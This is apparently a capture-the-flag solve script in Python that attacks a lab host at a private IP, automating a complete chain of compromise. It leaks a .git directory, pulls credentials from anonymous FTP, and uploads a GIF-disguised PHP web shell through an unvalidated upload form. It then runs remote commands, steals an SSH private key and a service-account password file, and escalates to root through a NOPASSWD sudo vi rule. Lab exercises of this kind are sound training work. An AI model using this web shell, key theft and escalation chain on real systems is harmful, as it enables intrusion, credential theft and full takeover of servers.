#!/usr/bin/env python3
"""
CYBER HERO Corp. - Careers & HR (Red Team) - standalone solve script
Target: 192.168.30.48
Kill chain:
  1. Exposed /.git + config.php.bak on the public careers portal
  2. Anonymous-ish FTP (ftp:ftp) leaks the Resume Viewer reset password
  3. No server-side MIME allowlist on the intake form -> upload PHP
  4. Authenticated direct execution of uploaded .php on the Resume Viewer vhost (53163) -> RCE as www-data
  5. World-readable SSH private keys (mika/sofia) -> login as sofia -> /opt/service_accounts.conf
  6. Somchai + NOPASSWD sudo vi -> GTFOBins root
  7. Decode base64 from /root/root.txt -> flag
"""
import base64
import io
import re
import sys
import ftplib
import requests
import paramiko

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace", write_through=True)

TARGET = "192.168.30.48"
WEB = f"http://{TARGET}"
VIEWER = f"http://{TARGET}:53163"
SSH_PORT = 29868

HR_USER = "somsuk@cyberhero.co.th"
HR_PASS = "somsuksuperhr123"
SHELL_NAME = "kilo_rce.php"
SHELL_PAYLOAD = b"GIF89a<?php echo 'KILO>>'; system($_GET['c']); echo '<<KILO'; ?>"


def step(msg):
    print(f"\n[*] {msg}")


# --- 1. Public git leak ---------------------------------------------------
step("Dumping exposed .git config / config.php.bak")
for path in ("/.git/config", "/config.php.bak"):
    try:
        print(requests.get(WEB + path, timeout=8).text.strip()[:200])
    except Exception as e:
        print("  !", path, e)


# --- 2. FTP password-reset drop ------------------------------------------
step("Reading the internal file server (FTP ftp:ftp)")
f = ftplib.FTP()
f.connect(TARGET, 21, timeout=8)
f.login("ftp", "ftp")
f.set_pasv(True)
hr = []
f.retrbinary("RETR hr.txt", hr.append)
hr_txt = b"".join(hr).decode(errors="replace")
print(hr_txt.strip())


# --- 3. Upload the PHP payload through the un-validated intake form ------
step("Uploading PHP payload via apply.php")
data = {"fullname": "Kilo", "email": "kilo@example.com",
        "position": "Data Engineer", "submit": "Submit application"}
r = requests.post(WEB + "/apply.php", data=data,
                  files={"resume": (SHELL_NAME, SHELL_PAYLOAD, "image/gif")}, timeout=20)
assert "notice ok" in r.text, "upload rejected"


# --- 4. Authenticated RCE on the Resume Viewer vhost ---------------------
step("Logging into the Resume Viewer and executing the payload")
s = requests.Session()
s.post(VIEWER + "/login.php", data={"username": HR_USER, "password": HR_PASS},
       allow_redirects=False, timeout=10)


def rce(cmd):
    t = s.get(VIEWER + "/" + SHELL_NAME, params={"c": cmd}, timeout=30).text
    i, j = t.find("KILO>>"), t.find("<<KILO")
    return t[i + 6:j] if i >= 0 else t[:300]


print(rce("id"))


# --- 5. Steal a world-readable key, then read service creds as sofia -----
step("Recovering sofia's SSH key (world-readable) and /opt/service_accounts.conf")
sofia_key = rce("cat /home/sofia/.ssh/id_rsa").replace("\r", "")
key_path = "sofia_key"
with open(key_path, "w", newline="\n") as fh:
    fh.write(sofia_key if sofia_key.endswith("\n") else sofia_key + "\n")

sc = paramiko.SSHClient()
sc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
sc.connect(TARGET, port=SSH_PORT, username="sofia", key_filename=key_path,
           timeout=10, allow_agent=False, look_for_keys=False)
svc = sc.exec_command("cat /opt/service_accounts.conf")[1].read().decode(errors="replace")
print(svc.strip())
sc.close()

m = re.search(r"Somchai:(\S+)", svc)
somchai_pass = m.group(1)
print(f"[+] Somchai password = {somchai_pass}")


# --- 6. Somchai -> sudo vi -> root ---------------------------------------
step("SSH as Somchai, escalate with NOPASSWD sudo vi, read /root/root.txt")
sc = paramiko.SSHClient()
sc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
sc.connect(TARGET, port=SSH_PORT, username="Somchai", password=somchai_pass,
           timeout=10, allow_agent=False, look_for_keys=False)


def vi_read(path):
    cmd = ("sudo -n /usr/bin/vi -c ':!cat %s > /tmp/kilo_read.txt 2>&1' -c ':q!' "
           ">/dev/null 2>&1; cat /tmp/kilo_read.txt" % path)
    return sc.exec_command(cmd, timeout=40)[1].read().decode(errors="replace")


root_txt = vi_read("/root/root.txt")
print(root_txt.strip())

# --- 7. Decode the real flag ---------------------------------------------
step("Decoding the real flag")
b64 = re.search(r"[A-Za-z0-9+/=]{40,}", root_txt).group(0)
flag = base64.b64decode(b64).decode()
print("\n=== FLAG ===")
print(flag)
sc.close()

